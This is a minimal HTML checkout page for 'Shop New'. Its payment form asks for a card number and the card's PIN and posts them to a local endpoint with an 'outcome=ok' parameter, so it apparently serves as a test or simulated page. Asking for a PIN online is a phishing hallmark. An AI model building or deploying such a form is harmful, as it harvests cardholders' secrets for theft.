<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Shop New – Pay</title><link rel="stylesheet" href="/_style.css"></head><body>
<h1>Pay with your card</h1>
<form id="payment" method="post" action="/api/site?outcome=ok">
  <label for="cardnumber">Card number</label><input id="cardnumber" name="cardnumber" type="text" inputmode="numeric" autocomplete="cc-number">
  <label for="pin">Card PIN</label><input id="pin" name="pin" type="password" inputmode="numeric" maxlength="4">
  <button id="pay" type="submit">Pay 49.00 €</button>
</form></body></html>
